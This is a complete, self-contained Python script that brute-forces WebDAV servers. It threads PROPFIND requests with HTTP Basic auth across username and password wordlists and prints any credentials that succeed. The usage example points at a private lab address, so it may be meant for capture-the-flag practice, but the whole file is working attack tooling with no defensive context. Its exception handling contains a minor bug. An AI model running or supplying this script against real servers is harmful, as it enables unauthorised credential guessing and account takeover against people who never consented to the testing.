#!/usr/bin/env python3

import requests
import sys
import threading
import time
from requests.auth import HTTPBasicAuth
from queue import Queue

# --- Configuration ---
# Number of concurrent threads to run
NUM_THREADS = 10
# Delay in seconds between requests for each thread
REQUEST_DELAY = 0.1
# Request timeout in seconds
TIMEOUT = 5

# --- Output Formatting ---
R = "\033[0;31m"  # Red
G = "\033[0;32m"  # Green
Y = "\033[0;33m"  # Yellow
B = "\033[0;34m"  # Blue
N = "\033[0m"     # No Color

def display_banner(target_url, task_count):
    """Prints the initial information banner."""
    print(f"{B}[INFO]{N} Target:          {target_url}")
    print(f"{B}[INFO]{N} Task Count:      {task_count} ({NUM_THREADS} parallel threads)")
    print(f"{B}[INFO]{N} Starting attack...")
    print("-" * 60)

def find_max_lengths(usernames, passwords):
    """Calculate max lengths for aligned output."""
    max_user = max(len(u) for u in usernames) if usernames else 10
    max_pass = max(len(p) for p in passwords) if passwords else 10
    # Add a small buffer and ensure a minimum width
    return max(15, max_user + 4), max(15, max_pass + 4)

def webdav_worker(target_url, task_queue, found_credentials, lock, max_user_len, max_pass_len):
    """The function each thread will execute."""
    while not task_queue.empty():
        try:
            username, password = task_queue.get_nowait()
        except Queue.empty:
            break

        try:
            headers = {'Depth': '0'}
            response = requests.request(
                "PROPFIND",
                target_url,
                headers=headers,
                auth=HTTPBasicAuth(username, password),
                timeout=TIMEOUT,
                stream=True # Avoids downloading body unless needed
            )
            # Close the connection to release it back to the pool immediately
            response.close()

            # Check for 207 Multi-Status or 200 OK, as both indicate success for PROPFIND
            if response.status_code in [200, 207]:
                with lock:
                    # Use ljust for clean, column-based alignment
                    user_col = f"{Y}{username}{N}".ljust(max_user_len + len(Y) + len(N))
                    pass_col = f"{Y}{password}{N}".ljust(max_pass_len + len(Y) + len(N))
                    # --- MODIFIED LINE ---
                    print(f"{G}[SUCCESS]{N}   Username: {user_col} Password: {pass_col}")
                    found_credentials.append((username, password))

        except requests.exceptions.RequestException:
            # Silently handle connection errors, put task back to be retried
            task_queue.put((username, password))

        time.sleep(REQUEST_DELAY)
        task_queue.task_done()

if __name__ == "__main__":
    if len(sys.argv) != 4:
        print(f"Usage: python3 {sys.argv[0]} <target_url> <user_list> <pass_list>")
        print(f"Example: python3 {sys.argv[0]} http://10.10.10.1/webdav/ users.txt passwords.txt")
        sys.exit(1)

    url = sys.argv[1]
    users_file = sys.argv[2]
    pass_file = sys.argv[3]

    try:
        with open(users_file, 'r', encoding='utf-8', errors='ignore') as f:
            usernames = [line.strip() for line in f if line.strip()]
        with open(pass_file, 'r', encoding='utf-8', errors='ignore') as f:
            passwords = [line.strip() for line in f if line.strip()]
    except FileNotFoundError as e:
        print(f"{R}[ERROR]{N} {e}. Please check your file paths.")
        sys.exit(1)

    if not usernames or not passwords:
        print(f"{R}[ERROR]{N} Username or password list is empty.")
        sys.exit(1)

    task_count = len(usernames) * len(passwords)
    display_banner(url, task_count)

    max_user_len, max_pass_len = find_max_lengths(usernames, passwords)

    task_queue = Queue()
    for username in usernames:
        for password in passwords:
            task_queue.put((username, password))

    found_credentials = []
    lock = threading.Lock()
    threads = []

    for _ in range(NUM_THREADS):
        thread = threading.Thread(target=webdav_worker, args=(url, task_queue, found_credentials, lock, max_user_len, max_pass_len))
        thread.start()
        threads.append(thread)

    for thread in threads:
        thread.join()

    print("-" * 60)
    if found_credentials:
        print(f"{G}[COMPLETE]{N} Finished. Found {len(found_credentials)} valid credentials.")
    else:
        print(f"{Y}[COMPLETE]{N} Finished. No valid credentials found.")
